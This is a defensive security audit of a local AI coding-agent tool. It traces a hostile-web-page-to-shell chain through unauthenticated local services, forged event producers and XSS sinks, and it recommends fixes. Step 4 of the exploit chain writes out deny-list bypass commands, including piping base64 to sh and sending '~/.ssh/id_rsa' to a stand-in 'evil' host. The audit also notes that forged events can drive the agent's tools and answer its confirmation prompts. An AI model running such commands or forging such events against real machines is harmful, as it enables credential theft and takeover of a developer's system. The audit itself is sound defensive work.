# Trevor V2 Security Risks

Trevor V2 is currently best treated as a trusted local developer tool with a
browser UI. It is not secure against a hostile browser, malicious extension,
malicious local webpage, or shared-machine attacker.

## Core Risk

The main risk is the local service boundary. The browser can publish events to
local services, and the host treats those events as user intent. Some of those
intents can trigger privileged local actions such as shell commands, editor
opens, worktree changes, host restart, and model/tool execution.

This means Trevor is safe only under a trusted-local-browser assumption unless
the local HTTP/WebSocket services add authentication and origin enforcement.

## Findings

- `apps/session-store/src/server.ts` uses permissive CORS and has no
  authentication.
- `POST /sessions/<id>/events` accepts events from anyone who can reach the
  session-store.
- The session WebSocket stream does not validate the `Origin` header.
- `producerId` is client-supplied and forgeable, so it should not be treated as
  authority.
- The host runs commands/actions for any non-host event once it decodes as a
  supported Trevor event.
- The prompt shell lane can execute shell commands through the host. Its safety
  layer is a deny-list, not a sandbox.
- `apps/blob-store/src/main.ts` logs a loopback URL but calls `listen(PORT)`
  without explicitly binding `127.0.0.1`, so the actual bind behavior should be
  tightened.
- The main markdown renderer sanitizes model-authored HTML with DOMPurify, which
  is good, but the web app does not currently show an explicit CSP in
  `apps/web/index.html`.
- Browser extensions with broad permissions remain outside the app's control and
  should be treated as equivalent to a compromised browser session.
- The XSS attack surface is broader than the main markdown renderer. Mermaid
  diagram rendering, syntax highlighting, Lucid artifact embedding, web
  fetch/search result rendering, and image/SVG rendering all render model- or
  network-sourced content and must each be audited for injection, not just the
  DOMPurify-sanitized markdown path. Any single injection point can read all of
  the origin's `localStorage`.
- The browser send queue / prompt-recall history (durable follow-up queue
  feature) persists prompt text in `localStorage`. `localStorage` is plaintext at
  rest in the browser profile and readable by any script on the origin, so an XSS
  exfiltrates the full recall history. The data is prompt text, not credentials,
  so the blast radius is confidentiality (drafts, pasted paths/snippets), not
  privilege escalation - but it is still browser-local persisted content to bound.

## Priority Fixes

1. Add a per-launch unguessable capability token required by the session-store,
   blob-store, web client, and host.
2. Reject HTTP and WebSocket requests unless `Origin` is exactly Trevor's local
   UI origin. Treat missing or unexpected origins conservatively.
3. Bind every local service explicitly to `127.0.0.1`, including blob-store.
4. Stop using `producerId` as an authority signal. Authenticate the publisher at
   the transport boundary instead.
5. Add host-side policy gates for privileged actions such as `user.shell`,
   `editor.open`, worktree mutation, `/restart`, and model/tool execution.
6. Add CSP and, where practical, Trusted Types for the web UI.
7. Keep durable secrets out of browser storage and rendered DOM. Store authority
   in the host, not the frontend.
8. For stronger operational isolation, run Trevor in a dedicated browser profile
   or browser instance with extensions disabled.
9. Audit every model- or network-sourced render path for injection (markdown,
   mermaid, syntax highlighting, Lucid artifacts, web fetch/search results,
   image/SVG), not just the primary DOMPurify-sanitized markdown renderer.
10. Bound the browser-local prompt-recall buffer: cap its size, expose a "clear
    recall history" control, and keep secret-shaped content out of it (extends
    fix 7 to the new `localStorage` recall store). Rely on client-side disk
    encryption (FileVault) for at-rest protection.

## Security Model

Until these fixes exist, Trevor's practical security model is:

- Trusted local user.
- Trusted browser profile.
- Trusted browser extensions.
- Trusted local web origins, or at least no malicious website attempting
  localhost access.
- Local services reachable only from the same machine.

That model is acceptable for some personal development workflows, but it should
not be presented as a hardened local control plane.

---

# Audit 2026-07-03 - browser-facing attack surface

A code-level re-audit against the current tree (post plans 22-25 + the deepening
work), focused on browser use. Method: four parallel read-only reviews (web XSS
render paths; local service boundary; browser storage / CSP / secret exposure;
host privileged-action gates), with the highest-severity chains re-verified by
hand. Every claim below carries `file:line` evidence and was confirmed against
current code.

Headline: the ledger's core-risk framing is correct and **all of its priority
fixes except the blob-store bind remain open**. The concrete, fully-verified
result is that a single hostile web page (or extension, or local process) visited
while a Trevor session is live can achieve **arbitrary shell execution on the
developer's machine** with no user interaction, because the local event boundary
has no authentication and the host treats a client-supplied `producerId` as
authority.

## The one exploit chain that matters (VERIFIED, critical)

1. `packages/server-kit/src/http.ts:16` sets `access-control-allow-origin: *`;
   no service checks the `Origin` header on the HTTP publish path or the
   WebSocket upgrade (`apps/session-store/src/server.ts:92-124, 152-187`), and
   there is no capability token anywhere on the boundary. So any web origin can
   `POST http://127.0.0.1:17424/sessions/<id>/events` (the target `<id>` is
   discoverable via cross-origin `GET /sessions`, readable because ACAO is `*`).
2. The publish endpoint validates only that `type` and `producerId` are strings
   (`server.ts:100`), then durably appends and fans the event out to every
   subscriber - including the host's own stream subscription
   (`main.ts` `onEvent: handleEvent`).
3. The host's only "gate" on acting is `isAnswerableProducer(producerId, self)`,
   which is literally `producerId !== "trevor-host"`
   (`packages/session/src/identity.ts:57-70`) - an echo filter, not
   authentication - plus a `live && lease.isLeader()` liveness check. Any forged
   `producerId` (e.g. `"trevor-web"`) passes.
4. A forged `user.shell` event reaches `runShellCommand`
   (`apps/agent-host/src/main.ts:989-1001`) ->
   `spawn(command, { shell: true })`
   (`apps/agent-host/src/processes/process-registry.ts:144-147`). The only
   barrier is `classifyAlwaysPreventedBashCommand`, which its own header calls a
   "BEST-EFFORT DEFENSE-IN-DEPTH FLOOR, not a sandbox" (`tools/bash-safety.ts:12`)
   and which is trivially bypassed (`echo <b64> | base64 -d | sh`,
   `python3 -c '...'`, `curl http://evil -o ~/.zshrc`,
   `cat ~/.ssh/id_rsa | curl -X POST --data-binary @- https://evil`,
   `git push`/`git reset --hard`). Result: arbitrary command execution.

Two more forgeable paths reach the same `shell: true` primitive: a forged
`user.command` with an unregistered `/shell <cmd>` falls through to
`run-shell.ts` `exec` (`/bin/sh -c`), and a forged `user.message` forks a full
agent turn (`agent/start-turn.ts:196`) whose `bash`/`edit`/`write` tools run
against the workspace (model-mediated, but a crafted prompt reliably drives it).

## Findings (new or sharpened since the original ledger)

### Boundary / privilege (host + local services)

- **B1 (critical, VERIFIED): forged inbound events drive privileged host
  actions; `producerId` is not authority.** Beyond `user.shell` (above), these
  arms fire for any non-`trevor-host` producer under normal live+leader
  operation: `user.command` -> `/restart` (host re-exec; `args:"force"` bypasses
  the debug gate, `commands/lifecycle.ts:100`), `/cd <path>` (re-exec at an
  attacker-chosen cwd, `session/session-switch.ts:214`),
  `/worktree-merge|delete` (git baseline mutation / force-remove a dirty
  worktree, `worktrees/git.ts:83-104`), `/handoff`; `editor.open` (opens an
  arbitrary path in the configured editor, `tools/open-editor.ts:22`);
  `provider.question.answer` (answers a pending `ask_user` confirmation the agent
  is blocked on - a confused-deputy approval, `main.ts:1002-1020`);
  `handoff.generated` + `handoff.approved` (host re-exec seeded with an
  attacker-controlled prompt, `main.ts:1021-1039`). `model.switch.requested` and
  `user.cancel` gate on liveness ONLY - they lack even the `producerId` echo
  check the other arms have (`main.ts:916-947`). Forged `host.beat`/`host.hello`
  with crafted instanceIds can perturb leader election (DoS via leadership flap).
  Fix: authenticate the publisher at the transport boundary and derive trust from
  that connection, never from the client-supplied `producerId` string; add real
  authorization gates on the re-exec / shell / worktree / editor arms.

- **B2 (high, VERIFIED): no auth + wildcard CORS + no Origin/Host check =
  CSRF + cross-origin read + DNS-rebinding.** A hostile page can POST events
  (CSRF), and open `ws://127.0.0.1:17424/sessions/<id>/stream` to receive the
  full replay-then-tail of a session - every prompt, model output, tool call,
  file content, pasted secret - because browsers do not apply SOP to the
  WebSocket connection and the server ignores `Origin`. `GET /sessions` leaks
  session enumeration + cwd/workspace/branch metadata cross-origin. The fixed
  URL base `new URL(req.url, "http://localhost")`
  (`packages/server-kit/src/service.ts:69`) ignores `Host`, so DNS-rebinding is
  unmitigated. Fix: reject unless `Origin` is exactly `http://127.0.0.1:17420`;
  validate `Host`; add a per-launch capability token (the real authenticator for
  non-browser local processes) carried in a header, never a query string.

- **B3 (medium, VERIFIED): DoS - unbounded inputs on the event path.**
  `readJson` buffers the whole body with no size cap
  (`packages/server-kit/src/http.ts:28-42`; contrast the blob path's bounded
  `readBody`), the WebSocket server sets no `maxPayload` and no connection cap
  (`session-store/server.ts:152`, unbounded subscriber `Set` in
  `session-hub.ts`), and `SessionLog.append` auto-creates sessions with no
  per-session quota or rate limit (`log.ts:100-129`). Anonymous floods exhaust
  memory/disk before any check. Fix: cap body size, set `maxPayload` + connection
  caps, quota/rate-limit per-session appends, require auth.

- **B4 (medium, VERIFIED): blob-store content-type reflection without
  `nosniff`.** `POST /blobs` stores the client `Content-Type` verbatim and
  reflects it on `GET` with a year-long immutable cache and no
  `X-Content-Type-Options: nosniff` (`apps/blob-store/src/server.ts:31,85-91`).
  An attacker can host active HTML/SVG on the `:17423` blob origin. Path traversal
  is SAFE (`HEX64` hash gate, `store.ts:93,115`) and there is no SSRF. Blast
  radius is limited because it executes on the blob origin, not the web-app
  origin. Fix: add `nosniff`; allowlist stored MIME to a safe media set or force
  `Content-Disposition: attachment` for non-media.

### Web XSS / render paths

- **W1 (high, VERIFIED): structured tool-result URLs rendered into JSX
  `<a href>` with no scheme allowlist - the one real XSS gap.** These sinks
  bypass the markdown sanitizer entirely: `components/chat/web-search.tsx:82`
  (`item.url`), `web-fetch.tsx:126` (`finalUrl`), `docs.tsx:136,181,208,231,309`
  (`SourceLink href`), `chooser/source-auth-panel.tsx:157`
  (`verificationUrl`). React 19 does not runtime-sanitize `href`, so a
  `javascript:` value from a compromised/forged tool-result event executes in the
  app origin on click (`target`/`rel` do not neuter it). With no CSP, that reads
  all storage and forges events. Fix: a shared `safeHref(url)` scheme allowlist
  (`http:`/`https:`/`mailto:` only) at every JSX href fed by tool/network data.

- **W2 (high, VERIFIED): no Content-Security-Policy and no Trusted Types.**
  `apps/web/index.html` sets no CSP; nothing serves one. This is the amplifier
  that turns any single injection (W1, a future DOMPurify bypass, a new render
  path) into full-origin compromise - no `connect-src` limit on exfiltration, no
  `script-src` floor. Fix: ship a CSP (meta tag now; header when a real server
  fronts the app) - `script-src 'self'` (no `eval`/wasm needed in app code),
  `connect-src` limited to self + blob-store + the session `ws:` + Sentry if
  configured, `img-src 'self' blob: data:`, `style-src 'unsafe-inline'` (Tailwind
  + mermaid) - and route the two `dangerouslySetInnerHTML` sinks
  (`markdown.tsx:182`, `mermaid-block.tsx:166`) through a DOMPurify Trusted Types
  policy.

- **W3 (low, VERIFIED): the document-artifact iframe has no `sandbox`
  attribute** (`artifact-panel/artifact-registry.tsx:76`), unlike the sibling
  HTML/Lucid viewer which is correctly sandboxed without `allow-scripts`
  (`:60-71`). Defense-in-depth only today (type-routing keeps script-capable
  content out, and it would execute on the blob origin regardless). Fix: add
  `sandbox` to match the HTML viewer.

### Browser storage / secret exposure (mostly reassuring)

- **S1 (medium, VERIFIED, corrects the original ledger): the prompt-recall
  buffer is in `sessionStorage`, not `localStorage`, and the send-queue does not
  persist at all.** `apps/web/src/composer-storage.ts` stores the unsubmitted
  draft (`trevor.draft.*`, cleared on submit/`/clear`) and a **capped-50**
  recall ring (`trevor.history.*`, `HISTORY_CAP=50`) in `sessionStorage`
  (tab-scoped, cleared on tab close) - a smaller blast radius than the ledger's
  "localStorage" wording implies. The durable-follow-up send queue is memory-only
  (`hooks/use-send-queue.ts`, React state). The confidentiality exposure (an XSS
  reads the draft + <=50 recall prompts) is still real. The recall cap (fix #10)
  is DONE; a "clear recall history" control and secret-shaped-line trimming are
  still MISSING. Fix: add a clear-history control that drops `trevor.history.*`;
  optionally strip `sk-...`/`bearer ...`-shaped lines before `appendHistory`.

- **S2 (CONFIRMED SAFE): no secret crosses to the browser.** No API key, auth
  token, 1Password/OP secret, or `~/.pi/auth.json` / `~/.trevorV2` **content**
  reaches the web client. The `host.online` payload, `SourceSummary` (auth STATE
  enum only), `host.sourceAuth` (public device-code `verificationUrl` + user
  code, never a key), doctor snapshot
  (`packages/session/src/doctor.ts:211-218` - built from the already-sanitized
  published snapshot), and provider diagnostics/incidents/failures are all
  redacted at the host boundary (`telemetry-contract.ts:26` strips bearer/token
  patterns; `provider-failure-log.ts:16`, `provider-diagnostic.ts:54`,
  `capability-manifest-export.ts:85`). No secret is in any web-storage key. The
  auth panel is an explicit no-key-in-browser boundary
  (`source-auth-panel.tsx:14-29`). Production build ships no source maps; the only
  build-time `VITE_*` values are service URLs + a public Sentry DSN, no keys.
  Residual (info, not secret): the same payloads ship host-environment recon
  (home-abbreviated cwd/workspace paths, config-file locations, git branch,
  command/agent names) readable by an XSS - bounded by W2, not an independent
  leak.

- **S3 (CONFIRMED SAFE): markdown and mermaid render paths are defended.** The
  primary renderer (`markdown.tsx:97`) uses DOMPurify with default config (no
  `ADD_TAGS`/`ADD_ATTR`/`ALLOW_UNKNOWN_PROTOCOLS`; code blocks escaped first);
  mermaid uses `securityLevel:"strict"` + a second SVG-profile DOMPurify pass
  (`mermaid-block.tsx:47,60`); assistant-ui markdown uses no `rehype-raw`. MCP
  tool-results, LSP hover/diagnostics, diff viewer, question-surface text, and
  image/SVG (all `<img>`, never inline) render as inert escaped text. No
  `window`/`globalThis` host-control leakage.

## Reconciliation with the pre-existing findings above

- session-store permissive CORS + no auth -> **STILL OPEN** (now owned by
  `server-kit/http.ts:16`; see B1/B2).
- `POST /sessions/<id>/events` accepts events from anyone -> **STILL OPEN** (B1).
- WS stream does not validate `Origin` -> **STILL OPEN** (B2).
- `producerId` client-supplied / forgeable -> **STILL OPEN** (B1; it is an echo
  filter, not authz).
- host runs actions for any non-host event -> **STILL OPEN** (B1).
- prompt shell lane is a deny-list, not a sandbox -> **STILL OPEN** (the RCE
  chain; the deny-list is trivially bypassed).
- blob-store `listen(PORT)` without binding 127.0.0.1 -> **FIXED / STALE.** Both
  stores now bind loopback by default via `server-kit/server.ts:34`. Residual: a
  `BLOB_STORE_HOST`/`SESSION_STORE_HOST=0.0.0.0` env override still exposes the
  unauthenticated service to the LAN (validate/reject non-loopback overrides).
- no CSP; broader XSS surface -> **STILL OPEN** (W2); the specific gap is W1, and
  the mermaid/highlighting/markdown paths audited here are safe (S3).
- recall buffer in localStorage -> **CORRECT the wording**: it is
  `sessionStorage`, capped at 50, and the send-queue is memory-only (S1).

## Updated priority (supersedes/refines the numbered list above)

1. **Authenticate the event boundary.** Per-launch unguessable capability token
   required by session-store, blob-store, the web client, and the host - carried
   in a header. This is the root fix for B1/B2 and the RCE chain; it is the
   difference between "reachable" and "authorized." (was #1/#4)
2. **Enforce Origin + Host** on every HTTP request and the WS upgrade; reject
   anything but `http://127.0.0.1:17420`; validate `Host` to stop DNS-rebinding.
   (was #2)
3. **Stop trusting `producerId`.** Derive the producer identity from the
   authenticated connection; add authorization gates on the re-exec / shell /
   worktree / editor / handoff arms; add the missing producer check to
   `model.switch.requested` and `user.cancel`. (was #4/#5)
4. **Sandbox or refuse `user.shell` / `/shell` / the `bash` tool** the way
   `tool_script` already is (fail-closed, `tool-script/launch.ts:134`); never
   present the deny-list as containment. (sharpens #5)
5. **Ship a CSP + Trusted Types** (W2), and add the `safeHref` scheme allowlist
   (W1). (was #6 + new)
6. **Harden the stores:** body-size cap, WS `maxPayload` + connection cap,
   per-session append quota/rate-limit (B3); blob `nosniff` + MIME allowlist
   (B4); reject non-loopback `*_HOST` overrides. (new)
7. **Bound browser-local recall:** add a clear-history control and optional
   secret-shaped-line trimming; the cap is already done (S1). (refines #10)
8. Keep durable secrets out of browser storage and the DOM - **currently
   satisfied** (S2); keep it that way as new surfaces land.

Net: no change to the practical security model (trusted-local-everything) - but
the browser-reachable RCE chain is now confirmed end-to-end in code, and fix #1
(authenticate the boundary) is the single highest-leverage change.
